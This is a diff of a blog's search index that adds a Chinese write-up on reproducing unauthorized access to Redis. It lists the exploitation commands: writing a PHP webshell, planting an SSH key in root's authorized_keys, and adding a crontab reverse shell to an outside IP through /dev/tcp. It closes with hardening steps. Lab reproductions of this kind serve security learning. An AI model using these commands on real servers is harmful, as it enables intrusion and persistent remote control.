+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> redis</span><br><span class="line">make</span><br><span class="line">make install 将redis-cli redis-server 安装到/usr/bin</span><br><span class="line"><span class="built_in">cp</span> redis.conf /etc</span><br><span class="line">修改redis.conf 配置文件 <span class="built_in">bind</span> 0.0.0.0,关闭密码认证，关闭服务器防火墙</span><br><span class="line">root启动</span><br></pre></td></tr></table></figure>
+
+<h1 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">安装 redis-cli</span><br><span class="line">yay -S redis</span><br><span class="line">redis-cli -h 192.168.56.110  连接redis</span><br><span class="line"></span><br><span class="line">**数据泄漏**</span><br><span class="line">keys *   获取所有 keys 值</span><br><span class="line"></span><br><span class="line">**系统信息**</span><br><span class="line">info    获取系统信息，redis版本，系统信息等</span><br><span class="line"></span><br><span class="line">**webshell**</span><br><span class="line"><span class="comment"># 写入一个string内容</span></span><br><span class="line"><span class="built_in">set</span> shell <span class="string">&quot;\n\n&lt;?=`<span class="variable">$_GET</span>[0]`?&gt;\n\n&quot;</span>    \n换行，防止写入数据混乱</span><br><span class="line"><span class="comment"># 设置备份目录</span></span><br><span class="line">config <span class="built_in">set</span> <span class="built_in">dir</span> /var/www/html/</span><br><span class="line"><span class="comment"># 设置备份文件名</span></span><br><span class="line">config <span class="built_in">set</span> dbfilename shell.php</span><br><span class="line"><span class="comment"># 保存文件到本地</span></span><br><span class="line">save</span><br><span class="line"></span><br><span class="line">**写入 SSH 公钥登陆无密码登陆目标系统**</span><br><span class="line"></span><br><span class="line">ssh-keygen -t rsa　　//执行生成key命令</span><br><span class="line"></span><br><span class="line"><span class="comment"># 备份文件目录设置为对应的 .ssh，一般默认为 /root/.ssh/</span></span><br><span class="line"></span><br><span class="line">config <span class="built_in">set</span> <span class="built_in">dir</span> /root/.ssh/</span><br><span class="line"></span><br><span class="line">config <span class="built_in">set</span> dbfilename authorized_keys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 保存key的时候加上两个`\n`是为了避免和Redis里其他缓存数据混合</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> key <span class="string">&quot;\n\n\生成的公钥n\n&quot;</span></span><br><span class="line"></span><br><span class="line">save</span><br><span class="line"></span><br><span class="line">**写入计划任务 crontab 运行命令，获取shell**</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> shell <span class="string">&quot;\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/192.168.110.141/4789 0&gt;&amp;1\n\n&quot;</span></span><br><span class="line"></span><br><span class="line">config <span class="built_in">set</span> <span class="built_in">dir</span> /var/spool/cron/</span><br><span class="line"></span><br><span class="line">config <span class="built_in">set</span> dbfilename root</span><br><span class="line"></span><br><span class="line">save</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h1 id="修复方式"><a href="#修复方式" class="headerlink" title="修复方式"></a><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>修复方式</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></h1><ul>
+<li>bind 127.0.0.1  只对本地开放</li>
+<li>requirepass password  设置密码认证</li>
+<li>修改默认端口</li>
+<li>设置防火墙规则</li>
+</ul>
+</div></div></div>
+
+<div class="note red icon-padding modern"><i class="note-icon fas fa-fan"></i><p>啊，再见了，再见了，哈</p>
+</div>
+
+<div class="note orange icon-padding modern"><i class="note-icon fas fa-battery-half"></i><p>我们会再见的对么</p>
+</div>
+
+<div class="note blue icon-padding modern"><i class="note-icon fas fa-bullhorn"></i><p>再见你要幸福</p>
+</div>
+
+<div class="note purple icon-padding modern"><i class="note-icon far fa-hand-scissors"></i><p>燕子，燕子</p>
+</div>
+
+]]></content>
+      <categories>
+        <category>未授权访问</category>
+        <category>redis</category>
+      </categories>
+      <tags>
+        <tag>redis</tag>
       </tags>
   </entry>
   <entry>
@@ -928,11 +1077,6 @@
     <content><![CDATA[]]></content>
   </entry>
   <entry>
-    <title>标签</title>
-    <url>/tags/index.html</url>
-    <content><![CDATA[]]></content>
-  </entry>
-  <entry>
     <title>音乐</title>
     <url>/music/index.html</url>
     <content><![CDATA[<div class="note blue icon-padding modern"><i class="note-icon fa-solid fa-music"></i><p>恋恋风尘-程壁</p>
@@ -958,6 +1102,11 @@
 
 
 ]]></content>
+  </entry>
+  <entry>
+    <title>标签</title>
+    <url>/tags/index.html</url>
+    <content><![CDATA[]]></content>
   </entry>
   <entry>
     <title>图库</title>
